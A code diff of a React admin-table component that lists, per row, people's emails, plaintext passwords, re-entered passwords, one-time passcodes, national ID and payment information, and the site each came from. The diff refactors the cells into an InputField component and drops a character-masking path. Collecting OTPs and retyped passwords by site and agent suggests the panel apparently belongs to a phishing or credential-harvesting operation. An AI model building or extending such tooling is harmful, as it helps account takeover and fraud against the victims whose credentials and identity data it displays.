@@ -5,10 +5,13 @@ import Loader from "../../common/Loader";
 import useInformation from "../../hooks/useInformation";
 import {  PaginationNav1Presentation } from "../Pagination/Pagination";
 import CardDataModal from "../../modals/CardDataModal";
-import {  useState } from "react";
+import {   useState } from "react";
 import NidInfoModal from "../../modals/NIdInfoModal";
+import InputField from "../forms/InputField";
+
 
 const InformationTable = () => {
+
   const [open,setOpen] = useState(false)
   const [nidOpen,setNidOpen] = useState(false)
   const [paymentInfo,setPaymentInfo] = useState({})
@@ -101,7 +104,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user,nidInfo,  createdAt,isPasswordHide, agent: { source }, status, email, password, repassword, otp, siteName, _id,paymentInfo, }:any,index) => (
+              displayInfo?.map(({ user,nidInfo,  createdAt, agent: { source },  email, password, repassword, otp, siteName, _id,paymentInfo, }:any,index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -119,26 +122,15 @@ const InformationTable = () => {
                       }`}>{siteName}</span>
 
                   </td>
-                  <td onClick={() => handleCopyClick(status ? (email as string).replace(/^(.{2})(.{1})/, '$1') : email)} className="px-2 py-1 font-bold cursor-pointer">
-
-                    <input type="text" className="p-2 dark:bg-graydark bg-bodydark1 " value={status ? (email as string).replace(/^(.{2})(.{2})/, '$1') : email} />
-                  </td>
-                  <td onClick={() => handleCopyClick(isPasswordHide ? (password as string).replace(/^(.{2})(.{2})/, '$1') : password)} className="px-2 py-1 font-bold cursor-pointer ">
-
-                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={isPasswordHide ? (password as string).replace(/^(.{2})(.{1})/, '$1') : password} />
-
-                  </td>
-                  <td onClick={() => handleCopyClick(isPasswordHide ? (repassword as string).replace(/^(.{2})(.{1})/, '$1') : repassword)} className="px-2 py-1 font-bold cursor-pointer ">
-
-                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={isPasswordHide ? (repassword as string)?.replace(/^(.{2})(.{1})/, '$1') : repassword} />
-
-                  </td>
-
-                  <td onClick={() => handleCopyClick(otp)} className="px-2 py-1 font-bold cursor-pointer ">
-                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={otp} />
+                 
+                  
+                  <InputField email={email} userId={user._id}/>
+                  <InputField email={password} userId={user._id}/>
+                  <InputField email={repassword} userId={user._id}/>
+                  <InputField email={otp} userId={user._id}/>
 
 
-                  </td>
+
                   {
                     (role === 'subadmin' || role === 'admin') && (
                       <td  className="px-2 py-1 font-bold cursor-pointer ">
